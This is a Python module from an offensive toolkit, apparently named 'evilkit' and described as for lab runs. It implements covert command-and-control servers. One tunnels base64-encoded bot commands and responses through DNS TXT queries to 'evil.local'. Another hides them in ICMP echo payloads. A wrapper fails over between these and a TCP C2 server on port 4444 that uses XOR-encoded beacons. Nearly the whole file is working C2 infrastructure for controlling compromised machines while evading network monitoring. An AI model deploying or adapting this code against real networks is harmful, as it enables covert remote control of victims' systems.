"""DNS tunnel and ICMP C2 channels for evilkit lab runs.

Complements the existing TCP C2 server (c2_server.py) with covert
alternative channels. DNS encodes commands in TXT record responses;
ICMP encodes commands in echo-reply payloads. A multi-channel wrapper
provides auto-failover across TCP, DNS, and ICMP.

Usage:
    from c2_channels import start_dns_c2, start_icmp_c2, create_multi_channel_c2
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import socket
import struct
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

try:
    import dns.message
    import dns.name
    import dns.opcode
    import dns.rcode
    import dns.rdataclass
    import dns.rdatatype
    import dns.renderer
    import dns.rrset
    import dns.tokenizer
    import dns.ttl
    DNSPYTHON_AVAILABLE = True
except ImportError:
    DNSPYTHON_AVAILABLE = False

logger = logging.getLogger("c2_channels")


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class DnsC2Server:
    domain: str
    port: int
    active: bool = False
    query_log: list[dict[str, Any]] = field(default_factory=list)
    command_log: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class IcmpC2Server:
    listen_addr: str
    active: bool = False
    packet_log: list[dict[str, Any]] = field(default_factory=list)
    command_log: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class ChannelStatus:
    name: str
    active: bool
    last_seen: float = 0.0
    commands_sent: int = 0
    commands_received: int = 0


@dataclass
class MultiChannelC2Report:
    channels: list[ChannelStatus]
    primary_channel: str
    failover_order: list[str]
    test_result: str = ""


# ---------------------------------------------------------------------------
# DNS C2
# ---------------------------------------------------------------------------

class _DnsC2Impl:
    """DNS C2 server — TXT record command channel."""

    def __init__(self, domain: str, listen_port: int, log_path: str):
        self.domain = domain
        self.listen_port = listen_port
        self.log_path = Path(log_path)
        self.data = DnsC2Server(domain=domain, port=listen_port)
        self._pending_commands: list[str] = []
        self._running = False
        self._transport: asyncio.DatagramTransport | None = None

    def _log_query(self, qname: str, qtype: str, response: str = ""):
        entry = {"ts": time.time(), "qname": qname, "qtype": qtype, "response": response}
        self.data.query_log.append(entry)
        try:
            with open(self.log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def _log_command(self, command: str, encoded: str):
        entry = {"ts": time.time(), "command": command, "encoded": encoded}
        self.data.command_log.append(entry)
        try:
            with open(self.log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def issue_command(self, command: str):
        """Queue a command for the next DNS query."""
        encoded = base64.b64encode(command.encode()).decode()
        self._pending_commands.append(encoded)
        self._log_command(command, encoded)

    def _parse_query_raw(self, data: bytes):
        """Parse a minimal DNS query from raw bytes (fallback path)."""
        # Header: 12 bytes, then question section
        if len(data) < 12:
            return None, None
        qdcount = struct.unpack("!H", data[4:6])[0]
        if qdcount == 0:
            return None, None
        # Walk the question name (sequence of length-prefixed labels, terminated by 0x00)
        offset = 12
        labels = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            labels.append(data[offset + 1: offset + 1 + length].decode("ascii", errors="replace"))
            offset += 1 + length
        # Next 4 bytes: QTYPE (2) + QCLASS (2)
        if offset + 4 > len(data):
            return None, None
        qtype_num = struct.unpack("!H", data[offset:offset + 2])[0]
        qname = ".".join(labels)
        qtype_map = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR", 15: "MX", 16: "TXT", 28: "AAAA", 255: "ANY"}
        qtype = qtype_map.get(qtype_num, f"TYPE{qtype_num}")
        return qname, qtype

    def _build_response_raw(self, txid: bytes, qname_bytes: bytes, txt_data: str, qtype_num: int = 16):
        """Build a DNS response with a TXT record using raw bytes."""
        encoded_txt = base64.b64encode(txt_data.encode()).decode()
        # Truncate to fit in a single DNS label (max 63 bytes per label)
        if len(encoded_txt) > 63:
            encoded_txt = encoded_txt[:63]

        # Header: TXID, flags (QR=1, AA=1), QDCOUNT=1, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
        flags = 0x8180  # QR=1, RD=1, RA=1
        header = txid + struct.pack("!HHHHH", flags, 1, 1, 0, 0)

        # Question: copy the original question section bytes
        # We need to reconstruct it — simplest is to re-encode the name
        question = self._encode_name(qname_bytes if len(qname_bytes) < 200 else b"\x07" + b"evil" + b"\x05" + b"local" + b"\x00")
        # Actually, let's just build a minimal question for the subdomain
        subdomain_labels = qname_bytes.split(b".") if b"." in qname_bytes else [qname_bytes]
        question = b""
        for label in subdomain_labels:
            if label:
                question += struct.pack("B", len(label)) + label
        question += b"\x00"
        question += struct.pack("!HH", qtype_num, 1)  # QTYPE, QCLASS=IN

        # Answer: name pointer to question (0xC00C), TYPE=TXT(16), CLASS=IN(1), TTL=0, RDLENGTH, RDATA
        answer_name = b"\xc0\x0c"  # pointer to offset 12
        answer_type = struct.pack("!H", 16)  # TXT
        answer_class = struct.pack("!H", 1)  # IN
        answer_ttl = struct.pack("!I", 0)
        txt_bytes = encoded_txt.encode()
        answer_rdata = struct.pack("B", len(txt_bytes)) + txt_bytes
        answer_rdlength = struct.pack("!H", len(answer_rdata))

        answer = answer_name + answer_type + answer_class + answer_ttl + answer_rdlength + answer_rdata
        return header + question + answer

    def _encode_name(self, name_bytes: bytes) -> bytes:
        """Encode a DNS name from dot-separated bytes."""
        parts = name_bytes.split(b".")
        result = b""
        for part in parts:
            if part:
                result += struct.pack("B", len(part)) + part
        result += b"\x00"
        return result

    async def _handle_dns_udp(self, data: bytes, addr, transport):
        """Handle a single DNS UDP query."""
        if len(data) < 12:
            return

        txid = data[:2]

        if DNSPYTHON_AVAILABLE:
            try:
                msg = dns.message.from_wire(data)
                if len(msg.question) == 0:
                    return
                qname = str(msg.question[0].name).rstrip(".")
                qtype = msg.question[0].rdtype
                qtype_str = dns.rdatatype.to_text(qtype) if isinstance(qtype, int) else str(qtype)
            except Exception:
                qname, qtype_str = self._parse_query_raw(data)
                if qname is None:
                    return
        else:
            qname, qtype_str = self._parse_query_raw(data)
            if qname is None:
                return

        self._log_query(qname, qtype_str)

        # Check if query is for our domain (subdomain.evil.local)
        if not qname.endswith(self.domain):
            # Not our domain — send NXDOMAIN
            if DNSPYTHON_AVAILABLE:
                try:
                    resp = dns.message.make_response(msg.id)
                    resp.set_rcode(dns.rcode.NXDOMAIN)
                    transport.sendto(resp.to_wire(), addr)
                except Exception:
                    pass
            return

        # Extract bot response from subdomain
        subdomain_part = qname[:-(len(self.domain) + 1)] if qname != self.domain else ""
        if subdomain_part:
            try:
                decoded = base64.b64decode(subdomain_part).decode()
                self._log_query(qname, qtype_str, response=f"bot_response:{decoded}")
                logger.info(f"DNS bot response: {decoded}")
            except Exception:
                pass

        # Issue next pending command as TXT response
        command = "none"
        if self._pending_commands:
            command = self._pending_commands.pop(0)

        if DNSPYTHON_AVAILABLE:
            try:
                resp = dns.message.make_response(msg.id)
                # Add the question back
                try:
                    qname_obj = dns.name.from_text(qname)
                except Exception:
                    qname_obj = dns.name.from_text(self.domain)
                resp.question.append(dns.rrset.from_rdata(qname_obj, 1, dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, f'"{command}"')))
                transport.sendto(resp.to_wire(), addr)
                return
            except Exception:
                pass

        # Fallback: raw response
        raw_resp = self._build_response_raw(txid, qname.encode("ascii", errors="replace"), command)
        transport.sendto(raw_resp, addr)

    async def start(self):
        """Start the DNS C2 server."""
        loop = asyncio.get_running_loop()

        class _DnsProtocol(asyncio.DatagramProtocol):
            def connection_made(outer_self, transport):
                self._transport = transport

            def datagram_received(outer_self, data, addr):
                trans = self._transport
                if trans:
                    asyncio.ensure_future(self._handle_dns_udp(data, addr, trans))

        try:
            transport, _ = await loop.create_datagram_endpoint(
                lambda: _DnsProtocol(),
                local_addr=("0.0.0.0", self.listen_port),
            )
            self._transport = transport
            self.data.active = True
            self._running = True
            logger.info(f"DNS C2 server listening on port {self.listen_port} for domain {self.domain}")
            self._log_query("*", "SERVER_START", f"DNS C2 active on port {self.listen_port}")

            # Keep running until stopped
            while self._running:
                await asyncio.sleep(1)
        except PermissionError:
            logger.error(f"Permission denied binding DNS port {self.listen_port} (requires root for port 53)")
            self.data.active = False
        except OSError as e:
            logger.error(f"DNS C2 server failed to start: {e}")
            self.data.active = False

    def stop(self):
        self._running = False
        self.data.active = False
        if self._transport:
            try:
                self._transport.close()
            except Exception:
                pass
            self._transport = None


def start_dns_c2(domain: str = "evil.local", listen_port: int = 53, log_path: str = "/tmp/c2_dns.log") -> DnsC2Server:
    """Start a DNS C2 server that encodes commands in TXT record responses.

    Runs the server in a background asyncio task. Returns the DnsC2Server
    dataclass so the caller can inspect query_log, command_log, and issue
    commands.
    """
    impl = _DnsC2Impl(domain=domain, listen_port=listen_port, log_path=log_path)

    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        task = loop.create_task(impl.start())
        return impl.data
    else:
        # No running loop — start synchronously for testing
        asyncio.run(impl.start())
        return impl.data


# ---------------------------------------------------------------------------
# ICMP C2
# ---------------------------------------------------------------------------

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
ICMP_HEADER_SIZE = 8


class _IcmpC2Impl:
    """ICMP C2 server — echo request/reply command channel."""

    def __init__(self, listen_addr: str, log_path: str):
        self.listen_addr = listen_addr
        self.log_path = Path(log_path)
        self.data = IcmpC2Server(listen_addr=listen_addr)
        self._pending_commands: list[str] = []
        self._running = False
        self._sock: socket.socket | None = None

    def _log_packet(self, src: str, payload: str = "", direction: str = "in"):
        entry = {"ts": time.time(), "src": src, "payload": payload, "direction": direction}
        self.data.packet_log.append(entry)
        try:
            with open(self.log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def _log_command(self, command: str, encoded: str):
        entry = {"ts": time.time(), "command": command, "encoded": encoded}
        self.data.command_log.append(entry)
        try:
            with open(self.log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def issue_command(self, command: str):
        """Queue a command for the next ICMP echo request."""
        encoded = base64.b64encode(command.encode()).decode()
        self._pending_commands.append(encoded)
        self._log_command(command, encoded)

    @staticmethod
    def _checksum(data: bytes) -> int:
        """ICMP checksum calculation."""
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_echo_reply(self, icmp_id: int, seq: int, payload: bytes) -> bytes:
        """Build an ICMP echo reply packet."""
        # Header: type(8), code(0), checksum(0), id, seq
        header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, icmp_id, seq)
        payload_data = base64.b64encode(payload) if payload else b"none"
        data = header + payload_data
        chksum = self._checksum(data)
        header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, chksum, icmp_id, seq)
        return header + payload_data

    async def start(self):
        """Start the ICMP C2 server."""
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self._sock.settimeout(1.0)
            self._sock.bind((self.listen_addr, 0))
        except PermissionError:
            logger.error("ICMP C2 requires root (raw socket). Run with sudo or set CAP_NET_RAW.")
            self.data.active = False
            return
        except OSError as e:
            logger.error(f"ICMP C2 failed to create raw socket: {e}")
            self.data.active = False
            return

        self.data.active = True
        self._running = True
        logger.info(f"ICMP C2 server listening on {self.listen_addr}")
        self._log_packet(self.listen_addr, "ICMP C2 active", direction="start")

        while self._running:
            try:
                packet, addr = self._sock.recvfrom(1024)
            except socket.timeout:
                continue
            except OSError:
                break

            # Parse IP header (min 20 bytes)
            if len(packet) < 20:
                continue

            ip_header = packet[:20]
            ip_ihl = (ip_header[0] & 0x0F) * 4
            src_ip = socket.inet_ntoa(ip_header[12:16])

            # Parse ICMP header
            icmp_start = ip_ihl
            if len(packet) < icmp_start + ICMP_HEADER_SIZE:
                continue

            icmp_type, icmp_code, icmp_chksum, icmp_id, icmp_seq = struct.unpack(
                "!BBHHH", packet[icmp_start:icmp_start + ICMP_HEADER_SIZE]
            )

            if icmp_type == ICMP_ECHO_REQUEST:
                # Extract payload
                icmp_payload = packet[icmp_start + ICMP_HEADER_SIZE:]
                payload_str = icmp_payload.decode("utf-8", errors="replace")
                self._log_packet(src_ip, payload_str, direction="in")

                # Try to decode bot response
                try:
                    decoded = base64.b64decode(payload_str).decode()
                    self._log_packet(src_ip, f"decoded:{decoded}", direction="in")
                    logger.info(f"ICMP bot response from {src_ip}: {decoded}")
                except Exception:
                    pass

                # Send echo reply with next command
                command = b"none"
                if self._pending_commands:
                    command = self._pending_commands.pop(0).encode()

                reply = self._build_echo_reply(icmp_id, icmp_seq, command)

                # Build IP header for reply
                ip_total = 20 + len(reply)
                ip_header_reply = struct.pack("!BBHHHBBH4s4s",
                    0x45,  # version=4, IHL=5
                    0,     # TOS
                    ip_total,
                    0,     # ID
                    0x4000,  # flags + frag offset
                    64,    # TTL
                    socket.IPPROTO_ICMP,
                    0,     # checksum
                    socket.inet_aton(self.listen_addr),
                    socket.inet_aton(src_ip),
                )
                # Calculate IP checksum
                ip_chk = self._checksum(ip_header_reply)
                ip_header_reply = struct.pack("!BBHHHBBH4s4s",
                    0x45, 0, ip_total, 0, 0x4000, 64, socket.IPPROTO_ICMP, ip_chk,
                    socket.inet_aton(self.listen_addr),
                    socket.inet_aton(src_ip),
                )

                try:
                    self._sock.sendto(ip_header_reply + reply, (src_ip, 0))
                    self._log_packet(src_ip, f"reply:{command.decode()}", direction="out")
                except OSError:
                    pass

    def stop(self):
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        self.data.active = False


def start_icmp_c2(listen_addr: str = "0.0.0.0", log_path: str = "/tmp/c2_icmp.log") -> IcmpC2Server:
    """Start an ICMP C2 server that encodes commands in ICMP echo reply payloads.

    Requires root (raw sockets). Returns the IcmpC2Server dataclass.
    If permission is denied, the server dataclass will have active=False.
    """
    impl = _IcmpC2Impl(listen_addr=listen_addr, log_path=log_path)

    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        loop.create_task(impl.start())
        return impl.data
    else:
        asyncio.run(impl.start())
        return impl.data


# ---------------------------------------------------------------------------
# Multi-Channel C2 with auto-failover
# ---------------------------------------------------------------------------

class _MultiChannelC2Impl:
    """Multi-channel C2 with auto-failover across TCP, DNS, and ICMP."""

    FAILBACK_ORDER = ["tcp", "dns", "icmp"]

    def __init__(
        self,
        tcp_host: str = "0.0.0.0",
        tcp_port: int = 4444,
        dns_domain: str = "evil.local",
        dns_port: int = 53,
        icmp_host: str = "0.0.0.0",
        http_url: str = "",
        test_failover: bool = False,
    ):
        self.tcp_host = tcp_host
        self.tcp_port = tcp_port
        self.dns_domain = dns_domain
        self.dns_port = dns_port
        self.icmp_host = icmp_host
        self.http_url = http_url
        self.test_failover = test_failover

        self.tcp_server: Any = None
        self.dns_impl: _DnsC2Impl | None = None
        self.icmp_impl: _IcmpC2Impl | None = None

        self.channels: list[ChannelStatus] = []
        self.primary_channel = "tcp"
        self.failover_order: list[str] = []
        self.test_result = ""

    def _build_channel_status(self, name: str, active: bool) -> ChannelStatus:
        return ChannelStatus(name=name, active=active, last_seen=time.time())

    async def _start_tcp(self):
        """Start the TCP C2 channel."""
        try:
            # Import works both as 'lib.c2_server' (from project root) and 'c2_server' (from lib/)
            try:
                from lib.c2_server import C2Server
            except ImportError:
                from c2_server import C2Server
            self.tcp_server = C2Server(host=self.tcp_host, port=self.tcp_port)
            task = asyncio.create_task(self.tcp_server.start())
            for _ in range(10):
                await asyncio.sleep(0.2)
                if self.tcp_server._server is not None:
                    break
            active = self.tcp_server._server is not None
            self.channels.append(self._build_channel_status("tcp", active))
            if active:
                logger.info("TCP C2 channel started")
            return active
        except Exception as e:
            logger.warning(f"TCP C2 channel failed to start: {e}")
            self.channels.append(self._build_channel_status("tcp", False))
            return False

    async def _start_dns(self):
        """Start the DNS C2 channel."""
        try:
            self.dns_impl = _DnsC2Impl(domain=self.dns_domain, listen_port=self.dns_port, log_path="/tmp/c2_dns_multi.log")
            task = asyncio.create_task(self.dns_impl.start())
            await asyncio.sleep(0.5)
            active = self.dns_impl.data.active if self.dns_impl else False
            self.channels.append(self._build_channel_status("dns", active))
            if active:
                logger.info("DNS C2 channel started")
            return active
        except Exception as e:
            logger.warning(f"DNS C2 channel failed to start: {e}")
            self.channels.append(self._build_channel_status("dns", False))
            return False

    async def _start_icmp(self):
        """Start the ICMP C2 channel."""
        try:
            self.icmp_impl = _IcmpC2Impl(listen_addr=self.icmp_host, log_path="/tmp/c2_icmp_multi.log")
            task = asyncio.create_task(self.icmp_impl.start())
            await asyncio.sleep(0.5)
            active = self.icmp_impl.data.active if self.icmp_impl else False
            self.channels.append(self._build_channel_status("icmp", active))
            if active:
                logger.info("ICMP C2 channel started")
            return active
        except Exception as e:
            logger.warning(f"ICMP C2 channel failed to start: {e}")
            self.channels.append(self._build_channel_status("icmp", False))
            return False

    def _get_failover_order(self) -> list[str]:
        """Determine failover order based on which channels are active."""
        order = []
        for ch in self.channels:
            if ch.active:
                order.append(ch.name)
        return order

    # ---- Real failover test helpers ----

    @staticmethod
    def _icmp_checksum(data: bytes) -> int:
        """ICMP checksum calculation."""
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_dns_query(self, qname: str, qtype: int = 16) -> bytes:
        """Build a minimal DNS query for TXT record."""
        txid = os.urandom(2)
        flags = 0x0100  # RD=1
        header = txid + struct.pack("!HHHHH", flags, 1, 0, 0, 0)
        name = b""
        for label in qname.split("."):
            name += struct.pack("B", len(label)) + label.encode("ascii", errors="replace")
        name += b"\x00"
        question = name + struct.pack("!HH", qtype, 1)
        return header + question

    def _parse_dns_response(self, data: bytes) -> bool:
        """Parse DNS response and check for TXT answer records."""
        if len(data) < 12:
            return False
        flags = struct.unpack("!H", data[2:4])[0]
        rcode = flags & 0x0F
        if rcode != 0:
            return False
        ancount = struct.unpack("!H", data[6:8])[0]
        if ancount == 0:
            return False
        offset = 12
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length & 0xC0:
                offset += 2
                break
            offset += 1 + length
        offset += 4
        for _ in range(ancount):
            if offset + 10 > len(data):
                break
            if data[offset] & 0xC0:
                offset += 2
            else:
                while offset < len(data):
                    length = data[offset]
                    if length == 0:
                        offset += 1
                        break
                    offset += 1 + length
            rtype = struct.unpack("!H", data[offset:offset + 2])[0]
            rdlength = struct.unpack("!H", data[offset + 8:offset + 10])[0]
            offset += 10 + rdlength
            if rtype == 16:
                return True
        return False

    async def _test_tcp_client(self) -> bool:
        """Connect to TCP C2, send XOR-encoded beacon, verify ACK."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.tcp_host, self.tcp_port),
                timeout=5,
            )
            beacon = json.dumps({"hostname": "test-bot", "pid": 12345, "uid": 0})
            xor_key = 0x5A
            encoded = bytes(b ^ xor_key for b in beacon.encode())
            writer.write(encoded)
            await writer.drain()
            response = await asyncio.wait_for(reader.read(4096), timeout=5)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            if response:
                decoded = bytes(b ^ xor_key for b in response).decode("utf-8", errors="replace")
                msg = json.loads(decoded)
                return msg.get("status") == "ok"
            return False
        except Exception as e:
            logger.warning("TCP client test failed: %s", e)
            return False

    async def _kill_tcp(self):
        """Kill the TCP C2 server."""
        if self.tcp_server and self.tcp_server._server:
            self.tcp_server._server.close()
            try:
                await asyncio.wait_for(self.tcp_server._server.wait_closed(), timeout=5)
            except Exception:
                pass
            logger.info("TCP C2 server killed")

    async def _verify_tcp_dead(self) -> bool:
        """Verify TCP C2 server is dead (connection refused)."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.tcp_host, self.tcp_port),
                timeout=2,
            )
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            return False
        except (ConnectionRefusedError, OSError, asyncio.TimeoutError):
            return True

    async def _test_dns_client(self) -> bool:
        """Send DNS TXT query and verify response contains answer."""
        try:
            query = self._build_dns_query("test." + self.dns_domain, 16)
            loop = asyncio.get_running_loop()

            def _send_and_recv():
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                sock.sendto(query, ("127.0.0.1", self.dns_port))
                data, _ = sock.recvfrom(4096)
                sock.close()
                return data

            data = await loop.run_in_executor(None, _send_and_recv)
            return self._parse_dns_response(data)
        except Exception as e:
            logger.warning("DNS client test failed: %s", e)
            return False

    async def _kill_dns(self):
        """Kill the DNS C2 server."""
        if self.dns_impl:
            self.dns_impl.stop()
            logger.info("DNS C2 server killed")

    async def _verify_dns_dead(self) -> bool:
        """Verify DNS C2 server is dead (no response)."""
        try:
            query = self._build_dns_query("test." + self.dns_domain, 16)
            loop = asyncio.get_running_loop()

            def _send_and_recv():
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(query, ("127.0.0.1", self.dns_port))
                data, _ = sock.recvfrom(4096)
                sock.close()
                return data

            await loop.run_in_executor(None, _send_and_recv)
            return False
        except (socket.timeout, OSError):
            return True

    async def _test_icmp_client(self) -> bool:
        """Send ICMP echo request and verify echo reply."""
        try:
            icmp_id = os.getpid() & 0xFFFF
            seq = 1
            payload = base64.b64encode(b"test-beacon").decode()
            header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, icmp_id, seq)
            icmp_data = header + payload.encode()
            chksum = self._icmp_checksum(icmp_data)
            header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, icmp_id, seq)
            packet = header + payload.encode()
            loop = asyncio.get_running_loop()

            def _send_and_recv():
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(5)
                sock.sendto(packet, ("127.0.0.1", 0))
                reply, _ = sock.recvfrom(1024)
                sock.close()
                return reply

            reply = await loop.run_in_executor(None, _send_and_recv)
            if len(reply) >= 28:
                ip_ihl = (reply[0] & 0x0F) * 4
                icmp_type = reply[ip_ihl]
                if icmp_type == ICMP_ECHO_REPLY:
                    return True
            return False
        except PermissionError:
            logger.warning("ICMP test requires root (raw socket)")
            return False
        except Exception as e:
            logger.warning("ICMP client test failed: %s", e)
            return False

    async def _kill_icmp(self):
        """Kill the ICMP C2 server."""
        if self.icmp_impl:
            self.icmp_impl.stop()
            logger.info("ICMP C2 server killed")

    async def _test_failover(self):
        """Actually test channel failover by starting real servers, connecting clients, and killing them."""
        results: list[str] = []

        tcp_ok = await self._start_tcp()
        dns_ok = await self._start_dns()
        icmp_ok = await self._start_icmp()

        if not tcp_ok and not dns_ok and not icmp_ok:
            self.test_result = "failover_test: no_channels_available"
            self.primary_channel = "none"
            self.failover_order = []
            return

        if tcp_ok:
            self.primary_channel = "tcp"
        elif dns_ok:
            self.primary_channel = "dns"
        elif icmp_ok:
            self.primary_channel = "icmp"

        self.failover_order = self._get_failover_order()

        # --- Step 1: Verify TCP works ---
        if tcp_ok:
            tcp_works = await self._test_tcp_client()
            if tcp_works:
                results.append("tcp: connected_and_responded")
                logger.info("FAILVER TEST: TCP channel verified working")
            else:
                results.append("tcp: connection_failed")
                logger.warning("FAILVER TEST: TCP channel failed client test")

            # Kill TCP server
            await self._kill_tcp()
            await asyncio.sleep(0.5)

            # Verify TCP is dead
            tcp_dead = await self._verify_tcp_dead()
            if tcp_dead:
                results.append("tcp: killed_and_verified_dead")
                logger.info("FAILVER TEST: TCP server confirmed dead")
            else:
                results.append("tcp: still_responding_after_kill")
                logger.warning("FAILVER TEST: TCP server still responding after kill")

            # Update channel status
            for ch in self.channels:
                if ch.name == "tcp":
                    ch.active = False
                    break

            # --- Step 2: Verify DNS works as failover ---
            if dns_ok:
                dns_works = await self._test_dns_client()
                if dns_works:
                    results.append("dns: failover_verified")
                    logger.info("FAILVER TEST: DNS channel verified as failover")
                else:
                    results.append("dns: failover_failed")
                    logger.warning("FAILVER TEST: DNS channel failed as failover")

                # Kill DNS server
                await self._kill_dns()
                await asyncio.sleep(0.5)

                # Verify DNS is dead
                dns_dead = await self._verify_dns_dead()
                if dns_dead:
                    results.append("dns: killed_and_verified_dead")
                    logger.info("FAILVER TEST: DNS server confirmed dead")
                else:
                    results.append("dns: still_responding_after_kill")
                    logger.warning("FAILVER TEST: DNS server still responding after kill")

                for ch in self.channels:
                    if ch.name == "dns":
                        ch.active = False
                        break

                # --- Step 3: Verify ICMP works as final failover ---
                if icmp_ok:
                    icmp_works = await self._test_icmp_client()
                    if icmp_works:
                        results.append("icmp: failover_verified")
                        logger.info("FAILVER TEST: ICMP channel verified as final failover")
                    else:
                        results.append("icmp: failover_failed")
                        logger.warning("FAILVER TEST: ICMP channel failed as final failover")

                    await self._kill_icmp()
                else:
                    results.append("icmp: not_available")
            elif icmp_ok:
                icmp_works = await self._test_icmp_client()
                if icmp_works:
                    results.append("icmp: failover_verified_after_tcp")
                    logger.info("FAILVER TEST: ICMP channel verified after TCP kill")
                else:
                    results.append("icmp: failover_failed_after_tcp")
                    logger.warning("FAILVER TEST: ICMP channel failed after TCP kill")
                await self._kill_icmp()
            else:
                results.append("icmp: not_available")

            # Update primary to next available
            for ch in self.channels:
                if ch.active:
                    self.primary_channel = ch.name
                    break

        elif dns_ok:
            # DNS is primary (TCP failed to start)
            dns_works = await self._test_dns_client()
            if dns_works:
                results.append("dns: primary_verified")
            else:
                results.append("dns: primary_failed")

            await self._kill_dns()
            await asyncio.sleep(0.5)
            for ch in self.channels:
                if ch.name == "dns":
                    ch.active = False
                    break

            if icmp_ok:
                icmp_works = await self._test_icmp_client()
                if icmp_works:
                    results.append("icmp: failover_verified")
                else:
                    results.append("icmp: failover_failed")
                await self._kill_icmp()
            else:
                results.append("icmp: not_available")

        elif icmp_ok:
            # ICMP is primary (TCP and DNS failed)
            icmp_works = await self._test_icmp_client()
            if icmp_works:
                results.append("icmp: primary_verified")
            else:
                results.append("icmp: primary_failed")
            await self._kill_icmp()

        self.test_result = "failover_test: " + " | ".join(results)

    async def start(self):
        """Start all C2 channels."""
        if self.test_failover:
            await self._test_failover()
            return

        # Start all channels
        await self._start_tcp()
        await self._start_dns()
        await self._start_icmp()

        # Determine primary and failover order
        self.failover_order = self._get_failover_order()
        if self.failover_order:
            self.primary_channel = self.failover_order[0]
        else:
            self.primary_channel = "none"

        self.test_result = "all_channels_started"

        # Keep running
        while True:
            await asyncio.sleep(1)

    def build_report(self) -> MultiChannelC2Report:
        return MultiChannelC2Report(
            channels=self.channels,
            primary_channel=self.primary_channel,
            failover_order=self.failover_order,
            test_result=self.test_result,
        )


def create_multi_channel_c2(
    tcp_host: str = "0.0.0.0",
    tcp_port: int = 4444,
    dns_domain: str = "evil.local",
    dns_port: int = 53,
    icmp_host: str = "0.0.0.0",
    http_url: str = "",
    test_failover: bool = False,
) -> MultiChannelC2Report:
    """Start all C2 channels with auto-failover.

    Starts TCP, DNS, and ICMP channels. If test_failover is True,
    actually starts real servers, connects test clients, kills each channel
    in sequence, and verifies failover to the next channel works.

    Returns a MultiChannelC2Report showing which channels are active
    and the failover order.
    """
    impl = _MultiChannelC2Impl(
        tcp_host=tcp_host,
        tcp_port=tcp_port,
        dns_domain=dns_domain,
        dns_port=dns_port,
        icmp_host=icmp_host,
        http_url=http_url,
        test_failover=test_failover,
    )

    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        loop.create_task(impl.start())
        return impl.build_report()
    else:
        asyncio.run(impl.start())
        return impl.build_report()
